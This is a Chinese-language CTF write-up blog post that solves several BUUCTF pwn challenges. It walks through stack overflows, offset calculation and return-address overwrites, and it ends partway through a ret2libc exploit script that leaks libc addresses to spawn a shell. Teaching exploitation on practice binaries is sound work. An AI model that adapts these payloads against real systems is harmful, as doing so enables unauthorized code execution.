href="#%E9%A2%98%E7%9B%AE-10"><span class="toc-number">11.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90-10"><span class="toc-number">11.2.</span> <span class="toc-text">IDA静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">11.2.1.</span> <span class="toc-text">整数溢出漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0-1"><span class="toc-number">11.2.2.</span> <span class="toc-text">后门函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload-6"><span class="toc-number">11.3.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://dashi777.github.io/2022/06/02/PWN-WP/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Dash"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Dash的C0mm3nt"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">PWN-WP</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2022-06-02 11:04:08" itemprop="dateCreated datePublished" datetime="2022-06-02T11:04:08+08:00">2022-06-02</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="Modified: 2022-06-06 17:12:50" itemprop="dateModified" datetime="2022-06-06T17:12:50+08:00">2022-06-06</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/2021%E5%B9%B4/" style="--text-color:dimgray" itemprop="url" rel="index"><span itemprop="text">2021年</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/wp/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">wp</span></a><a class="tag-item" href="/tags/pwn/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">pwn</span></a><a class="tag-item" href="/tags/%E9%80%86%E5%90%91/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">逆向</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h1 id="BUUCTF-rip"><a href="#BUUCTF-rip" class="headerlink" title="BUUCTF -rip"></a>BUUCTF -rip</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220512112756611-4139333.png" alt="image-20220512112756611" loading="lazy"></p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220512113151315-4139333.png" alt="img" loading="lazy"></p>
+<p>出现segment fault –代表程序有栈溢出漏洞。</p>
+<h3 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><h4 id="栈溢出位置"><a href="#栈溢出位置" class="headerlink" title="栈溢出位置"></a>栈溢出位置</h4><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220512232252104-4139333.png" alt="image-20220512232252104" loading="lazy"></p>
+<p>变量s本来申请的长度为15，但是puts函数可以获取的字符串长度没有限制，因此，这就是栈溢出的位置。</p>
+<p><strong>注：</strong>变量s的长度最准确应该通过gdb调试得出;</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220512232550382-4139333.png" alt="image-20220512232550382" loading="lazy"></p>
+<p>程序这里申请一个oxf（15）长度的空间，对应rbp-15，就是s的长度。</p>
+<h4 id="后台函数"><a href="#后台函数" class="headerlink" title="后台函数"></a>后台函数</h4><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220512232723747-4139333.png" alt="image-20220512232723747" loading="lazy"></p>
+<p>查看字符串可以看到<code>/bin/sh</code>，双击查看字符串所属位置0x401186</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220512234347603-4139333.png" alt="image-20220512234347603" loading="lazy"></p>
+<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><pre class="language-python" data-language="python"><code class="language-python">backdoor <span class="token operator">=</span> <span class="token number">0x401186</span>
+payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">15</span>  <span class="token comment">#栈溢出</span>
+payload <span class="token operator">+=</span> <span class="token string">b'0x00'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token comment">#覆盖rbp值</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>backdoor<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#控制返回地址(rbp+8)的值,+1 是为了对齐栈空间</span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513233331727-4139333.png" alt="image-20220513233331727" loading="lazy"></p>
+<h1 id="BUUCTF-warmup-csaw-2016"><a href="#BUUCTF-warmup-csaw-2016" class="headerlink" title="BUUCTF-warmup_csaw_2016"></a>BUUCTF-warmup_csaw_2016</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513233628040-4139333.png" alt="image-20220513233628040" loading="lazy"></p>
+<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><h3 id="运行程序-1"><a href="#运行程序-1" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513233837600-4139333.png" alt="image-20220513233837600" loading="lazy"></p>
+<p>还是段错误，是栈溢出漏洞</p>
+<h3 id="IDA静态分析-1"><a href="#IDA静态分析-1" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513233959753-4139333.png" alt="image-20220513233959753" loading="lazy"></p>
+<p>v5变量是一个典型的栈溢出点，需要出v5到rbp栈底的距离：</p>
+<h3 id="计算栈底距离"><a href="#计算栈底距离" class="headerlink" title="计算栈底距离"></a>计算栈底距离</h3><ol>
+<li>利用gdb构建足够长的字符串：</li>
+</ol>
+<pre class="language-bash" data-language="bash"><code class="language-bash">cyclic <span class="token number">200</span> //构造200个字符</code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513234302569-4139333.png" alt="image-20220513234302569" loading="lazy"></p>
+<ol>
+<li>运行程序至输入字符的位置，并输入刚刚构造的字符串</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513234407000-4139333.png" alt="image-20220513234407000" loading="lazy"></p>
+<ol>
+<li>可以看到整个栈已经被刚刚的字符填满，并且报错</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513234515612-4139333.png" alt="image-20220513234515612" loading="lazy"></p>
+<ol>
+<li>64位程序找出栈底rbp的前8位利用以下语句计算出栈底的距离：</li>
+</ol>
+<pre class="language-bash" data-language="bash"><code class="language-bash">cyclic -l xxxx<span class="token punctuation">(</span>rbp前8位<span class="token punctuation">)</span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513234744835-4139333.png" alt="image-20220513234744835" loading="lazy"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513234835130-4139333.png" alt="image-20220513234835130" loading="lazy"></p>
+<p><code>cyclic -l 0x61616172(&#39;aaar&#39;)</code>用cyclic计算到raaa为止有多少个字符，这个raaa正好是栈底的距离，因此+4之后就是栈溢出的距离，而rsp到rbp的距离就是<strong>72-8=64</strong></p>
+<p>所以栈溢出的距离是<strong>72</strong></p>
+<h3 id="后台函数-1"><a href="#后台函数-1" class="headerlink" title="后台函数"></a>后台函数</h3><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513235133456-4139333.png" alt="image-20220513235133456" loading="lazy"></p>
+<p>查看后台函数位置<strong>0x40060D</strong>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513235245035-4139333.png" alt="image-20220513235245035" loading="lazy"></p>
+<h2 id="构造payload-1"><a href="#构造payload-1" class="headerlink" title="构造payload"></a>构造payload</h2><pre class="language-python" data-language="python"><code class="language-python">backdoor <span class="token operator">=</span> <span class="token number">0x40060D</span>
+payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">64</span>  <span class="token comment">#栈溢出</span>
+payload <span class="token operator">+=</span> <span class="token string">b'0x00'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token comment">#覆盖rbp值</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>backdoor<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#控制返回地址(rbp+8)的值,+1 是为了对齐栈空间</span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220513235525078-4139333.png" alt="image-20220513235525078" loading="lazy"></p>
+<h1 id="BUUCTF-ciscn-2019-n-1"><a href="#BUUCTF-ciscn-2019-n-1" class="headerlink" title="BUUCTF-ciscn_2019_n_1"></a>BUUCTF-ciscn_2019_n_1</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516213929787-4139333.png" alt="image-20220516213929787" loading="lazy"></p>
+<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><h3 id="运行程序-2"><a href="#运行程序-2" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516214028499-4139333.png" alt="image-20220516214028499" loading="lazy"></p>
+<p>segment fault 有可能是栈溢出的题目，静态分析一下程序逻辑</p>
+<h3 id="IDA静态分析-2"><a href="#IDA静态分析-2" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> v1<span class="token punctuation">[</span><span class="token number">44</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>
+  <span class="token keyword">float</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-4h]</span>
+
+  v2 <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let's guess the number."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">gets</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token number">11.28125</span> <span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">else</span>
+    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Its value should be 11.28125"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>逻辑很简单，给了v1和v2两个变量，但是只让v1输入（不限制长度），那就是通过覆盖v1地址溢出至v2地址</p>
+<h3 id="空间计算"><a href="#空间计算" class="headerlink" title="空间计算"></a>空间计算</h3><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTYwNTk1,size_16,color_FFFFFF,t_70%23pic_center.png" alt="在这里插入图片描述" loading="lazy"></p>
+<p>从这里的汇编可以看出来，程序先申请了<strong>0x30</strong>的地址空间，然后<strong>rbp-04</strong>的空间用来保存v2的数据，然后又从<strong>rbp-0x30</strong>开始保存v1的数据</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTYwNTk1,size_16,color_FFFFFF,t_70#pic_center-16527115994592.png" loading="lazy"></p>
+<p>因此，整个栈空间的空间为<strong>0x30</strong>给了<strong>0x4</strong>的空间v2保存数据，那么v1的数据就有<strong>0x30-0x4=44</strong>的长度</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516223543065-4139334.png" loading="lazy"></p>
+<p><img src="PWN-WP.assets/image-20220516223543065-4139334.png" alt="image-20220516223543065" loading="lazy"></p>
+<p>gdb动态调试也验证了整个长度为<strong>0x30</strong></p>
+<p>然后，我们找一下<strong>11.28125</strong>对应的数据是多少：</p>
+<p><img src="PWN-WP.assets/image-20220516224143241-4139334.png" alt="image-20220516224143241" loading="lazy"></p>
+<p>同过这两个对比的汇编可以看出，这应该就是对比的值，双击看一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516224224052-4139334.png" alt="image-20220516224224052" loading="lazy"></p>
+<p><strong>4134800</strong>0就是16进制的<strong>11.28125</strong></p>
+<p>那么payload就很简单了</p>
+<h2 id="构造payload-2"><a href="#构造payload-2" class="headerlink" title="构造payload"></a>构造payload</h2><pre class="language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">44</span>  <span class="token comment">#V1溢出</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x41348000</span><span class="token punctuation">)</span> <span class="token comment">#覆盖v2值</span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516224603593-4139334.png" alt="image-20220516224603593" loading="lazy"></p>
+<h1 id="BUUCTF-pwn1-sctf-2016"><a href="#BUUCTF-pwn1-sctf-2016" class="headerlink" title="BUUCTF-pwn1_sctf_2016"></a>BUUCTF-pwn1_sctf_2016</h1><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516224753863-4139334.png" alt="image-20220516224753863" loading="lazy"></p>
+<h2 id="运行程序-3"><a href="#运行程序-3" class="headerlink" title="运行程序"></a>运行程序</h2><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516230119930-4139334.png" alt="image-20220516230119930" loading="lazy"></p>
+<p>看来不是简单的栈溢出</p>
+<h3 id="IDA静态分析-3"><a href="#IDA静态分析-3" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTQyNzY3Ng==,size_16,color_FFFFFF,t_70-20220602110854222.png" alt="在这里插入图片描述" loading="lazy"></p>
+<p>这题输入是s，但是s限制了长度，32位，而s的缓冲区长度是3C=60位</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516230253940-4139334.png" alt="image-20220516230253940" loading="lazy"></p>
+<p>但是题目main函数有一个字符串替换的动作，讲<strong>I</strong>替换成<strong>YOU</strong>，类似反序列化的字符串溢出，每替换一个<strong>I</strong>就多2个字符，那么要填满60位字符需要20个I，填满字符后就可以实现栈溢出</p>
+<h3 id="后门函数"><a href="#后门函数" class="headerlink" title="后门函数"></a>后门函数</h3><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516235101669-4139334.png" alt="image-20220516235101669" loading="lazy"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220516235754991-4139334.png" alt="image-20220516235754991" loading="lazy"></p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre class="language-python" data-language="python"><code class="language-python">backdoor <span class="token operator">=</span> <span class="token number">0x8048F0D</span>
+payload <span class="token operator">=</span> <span class="token string">"I"</span><span class="token operator">*</span><span class="token number">20</span>  <span class="token comment">#栈溢出</span>
+payload <span class="token operator">+=</span> <span class="token string">b'0x00'</span><span class="token operator">*</span><span class="token number">4</span> <span class="token comment">#覆盖rbp值 32位程序，所以只需要4位来覆盖</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span> <span class="token comment">#控制返回地址(rbp+8)的值,+1 是为了对齐栈空间</span></code></pre>
+
+<h1 id="BUUCTF-ciscn-2019-c-1"><a href="#BUUCTF-ciscn-2019-c-1" class="headerlink" title="BUUCTF-ciscn_2019_c_1"></a>BUUCTF-ciscn_2019_c_1</h1><h2 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h2><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220517224750234-4139334.png" alt="image-20220517224750234" loading="lazy"></p>
+<p>没开启canary保护，没有PIE地址偏移，开启了栈运行保护</p>
+<h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><h3 id="运行程序-4"><a href="#运行程序-4" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220517224911283-4139334.png" alt="image-20220517224911283" loading="lazy"></p>
+<p>回显有段错误，程序存在栈溢出漏洞</p>
+<h3 id="IDA静态分析-4"><a href="#IDA静态分析-4" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token class-name">size_t</span> v0<span class="token punctuation">;</span> <span class="token comment">// rbx</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-50h] BYREF</span>
+  __int16 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-20h]</span>
+
+  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input your Plaintext to be encrypted"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>题目中的encrypt函数存在栈溢出的漏洞，我们寻找一下程序是否有sys函数或者flag的字符</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220517231350472-4139334.png" alt="image-20220517231350472" loading="lazy"></p>
+<p>程序没有包含系统级的函数，只能通过其他方法getshell</p>
+<h2 id="ret2libc–通用步骤"><a href="#ret2libc–通用步骤" class="headerlink" title="ret2libc–通用步骤"></a>ret2libc–通用步骤</h2><h3 id="查看got和plt表"><a href="#查看got和plt表" class="headerlink" title="查看got和plt表"></a>查看got和plt表</h3><p>在GDB调试中查看程序调用的libc函数：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">got //查got表
+plt //查plt表</code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220517231741929-4139334.png" alt="image-20220517231741929" loading="lazy"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220517231806588-4139334.png" alt="image-20220517231806588" loading="lazy"></p>
+<h3 id="ROPGadget查看gadget"><a href="#ROPGadget查看gadget" class="headerlink" title="ROPGadget查看gadget"></a>ROPGadget查看gadget</h3><pre class="language-bash" data-language="bash"><code class="language-bash">ROPgadget --binary ./ciscn_2019_c_1 --only <span class="token string">"pop|ret"</span>
+ROPgadget --binary ./ciscn_2019_c_1 --only <span class="token string">"ret"</span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220517232119368-4139334.png" alt="image-20220517232119368" loading="lazy"></p>
+<p>可以利用的gadget有400c83(pop rdi ; ret) 和4006b9（ret）</p>
+<p>程序中有puts函数可以用于返回地址，那么我们可以构造第一组payload</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">rdi_pop_ret <span class="token operator">=</span> 0x400c83 <span class="token comment"># 控制rdi的值（rdi寄存器是第一个传参寄存器）</span>
+puts_plt <span class="token operator">=</span> elf.plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment">#找到plt表中puts函数的位置</span>
+puts_got <span class="token operator">=</span> elf.got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment">#找到got表中puts函数的位置</span>
+main_addr <span class="token operator">=</span> elf.symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span> <span class="token comment"># 找到main函数的位置</span>
+payload <span class="token operator">=</span> b<span class="token string">'a'</span>*<span class="token punctuation">(</span>0x50+8<span class="token punctuation">)</span> + p64<span class="token punctuation">(</span>rdi_pop_ret<span class="token punctuation">)</span> + p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> + p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> + p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token comment"># 填满整个栈空间 + 控制rdi的值 + 传入got表中puts函数的位置 + 调用plt表中的puts函数 + 返回主函数实现got表中puts函数位置的输出</span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220517233308789-4139334.png" alt="image-20220517233308789" loading="lazy"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220517233334942-4139334.png" alt="image-20220517233334942" loading="lazy"></p>
+<p>函数中got表中puts函数的位置是0x7f14502f2420</p>
+<h3 id="利用libcsearcher计算位置偏移和libc"><a href="#利用libcsearcher计算位置偏移和libc" class="headerlink" title="利用libcsearcher计算位置偏移和libc"></a>利用libcsearcher计算位置偏移和libc</h3><pre class="language-python" data-language="python"><code class="language-python">puts_real <span class="token operator">=</span> u64<span class="token punctuation">(</span>c<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>puts_real<span class="token punctuation">)</span>
+libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_real<span class="token punctuation">)</span>
+offset <span class="token operator">=</span> puts_real <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span></code></pre>
+
+<h3 id="利用libc-so调用系统函数getshell"><a href="#利用libc-so调用系统函数getshell" class="headerlink" title="利用libc.so调用系统函数getshell"></a>利用libc.so调用系统函数getshell</h3><pre class="language-python" data-language="python"><code class="language-python">ret <span class="token operator">=</span> <span class="token number">0x4006b9</span>
+system_real <span class="token operator">=</span> offset <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
+bin_sh_addr <span class="token operator">=</span> offset <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_real<span class="token punctuation">)</span> <span class="token comment">#利用ret对齐堆栈，防止无法运行系统函数</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input your choice!\n'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input your Plaintext to be encrypted\n'</span><span class="token punctuation">,</span> payload2<span class="token punctuation">)</span></code></pre>
+
+<h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding: utf-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token punctuation">)</span> <span class="token comment">#开启调试</span>
+content <span class="token operator">=</span> <span class="token number">0</span>
+filename <span class="token operator">=</span> <span class="token string">"./ciscn_2019_c_1"</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'ciscn_2019_c_1'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        p <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
+        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">28521</span><span class="token punctuation">)</span>
+    
+    pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400c83</span> <span class="token comment"># 控制rdi的值（rdi寄存器是第一个传参寄存器）</span>
+    puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment">#找到plt表中puts函数的位置</span>
+    puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment">#找到got表中puts函数的位置</span>
+    main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span> <span class="token comment"># 找到main函数的位置</span>
